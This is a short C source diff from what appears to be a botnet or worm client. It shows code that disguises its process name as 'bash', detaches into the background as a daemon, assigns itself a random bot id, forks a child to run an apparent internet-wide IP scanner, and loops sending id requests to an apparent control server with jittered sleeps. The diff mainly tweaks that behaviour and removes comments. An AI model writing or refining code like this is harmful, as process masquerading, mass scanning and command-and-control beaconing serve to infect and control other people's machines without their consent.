@@ -61,7 +61,6 @@ int main(int argc, char *argv[])
 		argv[0] = "bash";
 		prctl(PR_SET_NAME, (unsigned long)name, 0, 0, 0);
 	
-		// fork avant setsid()
 		if (pid1 = fork())
 		{
 			waitpid(pid1, &status, 0);
@@ -78,12 +77,10 @@ int main(int argc, char *argv[])
 			}
 			else
 			{
-				// zprintf("fork failed\n");
 			}
 		}
 		else
 		{
-			// zprintf("fork failed\n");
 		}
 		setsid();
 		chdir("/");
@@ -96,8 +93,12 @@ int main(int argc, char *argv[])
 	uwu = ft_itoa(rand() % 100000);
 	id = ft_strnjoin(id, "-", 1);
 	id = ft_strnjoin(id, uwu, strlen(uwu));
-	if (pthread_create(&ip_searcher, NULL, (void *)&ft_scan_world, NULL))
-		pthread_join(ip_searcher, NULL);
+	if (!fork())
+	{
+		ft_scan_world();
+		exit(0);
+	}
+	free(uwu);
 	while (true)
 	{
 		request = ft_strjoin("?id=", id);
@@ -114,7 +115,7 @@ int main(int argc, char *argv[])
 		if (DEBUG)
 			usleep(250000);
 		else
-			sleep(rand() % 3);
+			sleep(rand() % 10);
 	}
 	return (0);
 }
